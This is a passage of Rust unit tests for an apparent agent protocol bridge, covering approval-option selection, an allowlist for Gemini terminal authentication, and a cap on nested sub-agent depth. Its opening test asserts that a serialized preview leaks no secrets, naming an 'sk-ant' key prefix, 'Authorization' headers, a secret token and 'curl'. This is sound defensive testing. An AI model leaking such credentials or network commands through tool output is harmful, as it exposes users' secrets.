        assert_eq!(preview["content_count"], json!(1));

        assert!(!serialized.contains("rawInput"));
        assert!(!serialized.contains("rawOutput"));
        assert!(!serialized.contains("SECRET_TOKEN"));
        assert!(!serialized.contains("abc123"));
        assert!(!serialized.contains("vendorSecret"));
        assert!(!serialized.contains("Authorization"));
        assert!(!serialized.contains("sk-ant"));
        assert!(!serialized.contains("curl"));
    }
}

#[cfg(test)]
mod approval_picker_tests {
    use super::{pick_approve_option_id, pick_reject_option_id};
    use serde_json::json;

    fn opts() -> Vec<serde_json::Value> {
        vec![
            json!({"kind":"allow_always","optionId":"AA"}),
            json!({"kind":"allow_once","optionId":"AO"}),
            json!({"kind":"reject_once","optionId":"RO"}),
        ]
    }

    #[test]
    fn approve_prefers_allow_once_over_allow_always() {
        assert_eq!(pick_approve_option_id(&opts()).unwrap(), "AO");
    }

    #[test]
    fn approve_falls_back_to_allow_always_when_only_persistent_offered() {
        let only_persistent = vec![
            json!({"kind":"allow_always","optionId":"AA"}),
            json!({"kind":"reject_once","optionId":"RO"}),
        ];
        assert_eq!(pick_approve_option_id(&only_persistent).unwrap(), "AA");
    }

    #[test]
    fn reject_prefers_reject_once_over_reject_always() {
        let with_persistent_reject = vec![
            json!({"kind":"reject_always","optionId":"RA"}),
            json!({"kind":"reject_once","optionId":"RO"}),
        ];
        assert_eq!(
            pick_reject_option_id(&with_persistent_reject).unwrap(),
            "RO"
        );
    }

    #[test]
    fn reject_errors_when_no_reject_option() {
        let no_reject = vec![json!({"kind":"allow_once","optionId":"AO"})];
        assert!(pick_reject_option_id(&no_reject).is_err());
    }
}

#[cfg(test)]
mod gemini_terminal_auth_tests {
    //! Pure unit tests for the synthesis helpers + allowlist constants.
    //! The integration matrix (allowlist gate, command-mismatch reject)
    //! lives in `tests/session_authenticate.rs`.
    use super::*;

    #[test]
    fn strip_acp_args_removes_only_acp_runtime_flags() {
        let input = vec![
            "--acp".to_string(),
            "--auth-methods".to_string(),
            "[]".to_string(),
            "--experimental-acp".to_string(),
            "--debug".to_string(),
        ];
        let stripped = strip_acp_args(&input);
        assert_eq!(
            stripped,
            vec![
                "--auth-methods".to_string(),
                "[]".to_string(),
                "--debug".to_string(),
            ],
            "strip_acp_args must remove --acp and --experimental-acp and keep everything else"
        );
    }

    #[test]
    fn strip_acp_args_passes_through_when_no_acp_flag_present() {
        let input = vec!["--login".to_string(), "--quiet".to_string()];
        let stripped = strip_acp_args(&input);
        assert_eq!(stripped, input, "non-ACP args must be untouched");
    }

    #[test]
    fn synthesize_gemini_method_uses_configured_command_with_acp_args_stripped() {
        let cmd = std::path::PathBuf::from("/usr/local/bin/gemini");
        let args = vec![
            "--acp".to_string(),
            "--debug".to_string(),
            "--experimental-acp".to_string(),
        ];
        let m = synthesize_gemini_terminal_auth_method(&cmd, &args);
        assert_eq!(m["id"], serde_json::json!(GEMINI_TERMINAL_AUTH_METHOD_ID));
        assert_eq!(m["type"], serde_json::json!("terminal"));
        assert_eq!(
            m["_meta"]["terminal-auth"]["command"],
            serde_json::json!("/usr/local/bin/gemini")
        );
        // ACP runtime flags must have been stripped from the synthesized
        // invocation — the auth flow needs interactive mode, not ACP.
        assert_eq!(
            m["_meta"]["terminal-auth"]["args"],
            serde_json::json!(["--debug"])
        );
    }

    #[test]
    fn merge_synthetic_skips_when_id_already_present() {
        let advertised = serde_json::json!([
            { "id": GEMINI_TERMINAL_AUTH_METHOD_ID, "type": "terminal" }
        ]);
        let synthesized = serde_json::json!({
            "id": GEMINI_TERMINAL_AUTH_METHOD_ID,
            "type": "terminal",
            "_meta": { "terminal-auth": { "command": "x", "args": [] } }
        });
        let merged = merge_synthetic_terminal_auth_method(advertised.clone(), synthesized);
        assert_eq!(merged, advertised, "existing entry with same id must win");
    }

    #[test]
    fn merge_synthetic_appends_when_advertised_array_is_empty() {
        let advertised = serde_json::json!([]);
        let synthesized = serde_json::json!({
            "id": GEMINI_TERMINAL_AUTH_METHOD_ID,
            "type": "terminal"
        });
        let merged = merge_synthetic_terminal_auth_method(advertised, synthesized.clone());
        let arr = merged.as_array().expect("merged must be an array");
        assert_eq!(arr.len(), 1);
        assert_eq!(arr[0], synthesized);
    }

    #[test]
    fn terminal_auth_allowlist_is_minimal_and_includes_gemini() {
        assert!(
            TERMINAL_AUTH_ALLOWED_AGENTS.contains(&"gemini-acp"),
            "gemini-acp must be allowlisted"
        );
        assert!(
            !TERMINAL_AUTH_ALLOWED_AGENTS.contains(&"claude-acp"),
            "claude-acp uses adapter OAuth, must NOT be allowlisted for terminal auth"
        );
    }

    #[test]
    fn authenticate_error_terminal_auth_not_allowed_has_stable_code() {
        let err = AuthenticateError::TerminalAuthNotAllowed {
            method_id: "x".into(),
            agent_id: "some-agent".into(),
        };
        assert_eq!(err.code(), "auth.terminal_auth_not_allowed");
        assert_eq!(err.method_type(), Some("terminal"));
        assert_eq!(err.method_id(), Some("x"));
        assert!(err.message().contains("some-agent"));
    }
}

#[cfg(test)]
mod task_scope_depth_tests {
    //! X.5h.3 — the bridge must push the parent task tool_call_id onto a
    //! per-session stack so child events can attach `parent_tool_call_id`,
    //! and it must refuse pushes beyond `MAX_SUBAGENT_DEPTH` so a
    //! pathological provider can't fork-bomb the timeline by recursively
    //! dispatching sub-agents.
    //!
    //! These tests exercise the pure helpers (`try_push_task_scope`,
    //! `current_task_parent_in`) so we don't need to spawn an ACP child
    //! to assert the depth-cap contract. The wire-up between
    //! `AcpRuntime::enter_task_scope` and `try_push_task_scope` is a
    //! one-line lock-then-delegate, covered by the existing integration
    //! suite that drives a real session.

    use super::{
        current_task_parent_in, try_push_task_scope, EnterTaskScopeResult, MAX_SUBAGENT_DEPTH,
    };

    /// Mirror of `AcpRuntime::exit_task_scope` for the pure helpers.
    fn exit_in(stack: &mut Vec<String>, tool_call_id: &str) {
        stack.retain(|id| id.as_str() != tool_call_id);
    }

    #[test]
    fn first_push_returns_pushed_with_depth_one() {
        let mut stack: Vec<String> = Vec::new();
        let r = try_push_task_scope(&mut stack, "tc_a");
        assert_eq!(r, EnterTaskScopeResult::Pushed { new_depth: 1 });
        assert_eq!(
            current_task_parent_in(&stack, "").as_deref(),
            Some("tc_a"),
            "the only entry on the stack is the parent for any non-self lookup"
        );
    }

    #[test]
    fn duplicate_push_is_idempotent_and_reports_already_present() {
        let mut stack: Vec<String> = Vec::new();
        assert_eq!(
            try_push_task_scope(&mut stack, "tc_a"),
            EnterTaskScopeResult::Pushed { new_depth: 1 }
        );
        assert_eq!(
            try_push_task_scope(&mut stack, "tc_a"),
            EnterTaskScopeResult::AlreadyPresent
        );
        // Stack tip is still tc_a; idempotent push did not double-stack.
        assert_eq!(current_task_parent_in(&stack, "").as_deref(), Some("tc_a"));
        assert_eq!(stack.len(), 1, "idempotent push must not grow the stack");
    }

    #[test]
    fn pushes_up_to_max_depth_succeed() {
        let mut stack: Vec<String> = Vec::new();
        for i in 0..MAX_SUBAGENT_DEPTH {
            let id = format!("tc_{i}");
            assert_eq!(
                try_push_task_scope(&mut stack, &id),
                EnterTaskScopeResult::Pushed { new_depth: i + 1 },
                "push at depth {} should succeed",
                i + 1
            );
        }
        assert_eq!(stack.len(), MAX_SUBAGENT_DEPTH);
    }

    #[test]
    fn push_beyond_max_depth_is_refused() {
        let mut stack: Vec<String> = Vec::new();
        for i in 0..MAX_SUBAGENT_DEPTH {
            assert!(matches!(
                try_push_task_scope(&mut stack, &format!("tc_{i}")),
                EnterTaskScopeResult::Pushed { .. }
            ));
        }
        let refused = try_push_task_scope(&mut stack, "tc_overflow");
        assert_eq!(
            refused,
            EnterTaskScopeResult::RefusedDepthExceeded {
                current_depth: MAX_SUBAGENT_DEPTH,
                max_depth: MAX_SUBAGENT_DEPTH,
            }
        );
        assert_eq!(
            stack.len(),
            MAX_SUBAGENT_DEPTH,
            "refused push must not grow the stack"
        );
    }

    #[test]
    fn refused_overflow_does_not_appear_in_parent_lookup() {
        let mut stack: Vec<String> = Vec::new();
        for i in 0..MAX_SUBAGENT_DEPTH {
            try_push_task_scope(&mut stack, &format!("tc_{i}"));
        }
        try_push_task_scope(&mut stack, "tc_overflow");
        // The overflow id MUST NOT show up as a parent for any
        // descendant; descendants instead snapshot the depth-cap
        // ancestor (the last successfully pushed task).
        let parent = current_task_parent_in(&stack, "tc_child_of_overflow");
        let expected = format!("tc_{}", MAX_SUBAGENT_DEPTH - 1);
        assert_eq!(
            parent.as_deref(),
            Some(expected.as_str()),
            "refused overflow must surface children under the depth-cap ancestor"
        );
    }

    #[test]
    fn exit_pops_anywhere_in_stack_to_tolerate_parallel_completion() {
        let mut stack: Vec<String> = Vec::new();
        try_push_task_scope(&mut stack, "tc_a");
        try_push_task_scope(&mut stack, "tc_b");
        try_push_task_scope(&mut stack, "tc_c");
        // Middle task completes first (parallel sub-agents).
        exit_in(&mut stack, "tc_b");
        assert_eq!(current_task_parent_in(&stack, "").as_deref(), Some("tc_c"));
        // After tc_c also completes, tc_a remains.
        exit_in(&mut stack, "tc_c");
        assert_eq!(current_task_parent_in(&stack, "").as_deref(), Some("tc_a"));
    }

    #[test]
    fn exit_creates_room_for_a_new_push_after_overflow() {
        let mut stack: Vec<String> = Vec::new();
        for i in 0..MAX_SUBAGENT_DEPTH {
            try_push_task_scope(&mut stack, &format!("tc_{i}"));
        }
        assert!(matches!(
            try_push_task_scope(&mut stack, "tc_refused"),
            EnterTaskScopeResult::RefusedDepthExceeded { .. }
        ));
        exit_in(&mut stack, "tc_0");
        // After freeing a slot, a new push succeeds and lands at the top.
        assert!(matches!(
            try_push_task_scope(&mut stack, "tc_after_pop"),
            EnterTaskScopeResult::Pushed { .. }
        ));
        assert_eq!(
            current_task_parent_in(&stack, "").as_deref(),
            Some("tc_after_pop")
        );
    }

    #[test]
    fn current_task_parent_skips_self() {
        let mut stack: Vec<String> = Vec::new();
        try_push_task_scope(&mut stack, "tc_outer");
        try_push_task_scope(&mut stack, "tc_inner");
        // The inner task itself must not parent itself — the helper
        // walks the stack from tip to root and skips a matching id.
        assert_eq!(
            current_task_parent_in(&stack, "tc_inner").as_deref(),
            Some("tc_outer")
        );
        // A non-task descendant snapshots the tip.
        assert_eq!(
            current_task_parent_in(&stack, "tc_some_child").as_deref(),
            Some("tc_inner")
        );
    }
}
